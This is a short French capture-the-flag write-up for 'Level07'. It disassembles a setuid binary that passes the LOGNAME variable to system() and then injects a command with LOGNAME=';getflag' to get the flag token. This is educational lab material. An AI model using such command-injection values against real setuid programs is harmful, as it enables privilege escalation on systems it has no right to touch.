# Level07

Premiere étape de recherche

	$ ls -la
	-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07

On trouve un binaire avec setuid et setgid

	$ ./level07
	level07

Il affiche son nom


Analysons le avec GDB.

	.....
	0x0804856f <+91>:	mov    DWORD PTR [esp],0x8048680
	0x08048576 <+98>:	call   0x8048400 <getenv@plt>
	0x0804857b <+103>:	mov    DWORD PTR [esp+0x8],eax
	0x0804857f <+107>:	mov    DWORD PTR [esp+0x4],0x8048688
	0x08048587 <+115>:	lea    eax,[esp+0x14]
	0x0804858b <+119>:	mov    DWORD PTR [esp],eax
	0x0804858e <+122>:	call   0x8048440 <asprintf@plt>
	0x08048593 <+127>:	mov    eax,DWORD PTR [esp+0x14]
	0x08048597 <+131>:	mov    DWORD PTR [esp],eax
	0x0804859a <+134>:	call   0x8048410 <system@plt>
	.....

	env = getenv("LOGNAME");
	asprintf(str, "/bin/echo %s ", env);
	system(str);

Le programme fait un echo de la variable d'environnement LOGNAME grace a la fonction "system"

Si on modifie la variable d'environnement LOGNAME...

	$ export LOGNAME=coucou
	$ ./level07
	coucou

On va y injecter une autre commande

	$ export LOGNAME=';getflag'
	$ ./level07
	Check flag.Here is your token : XXXXXXXXXXXXXXXX
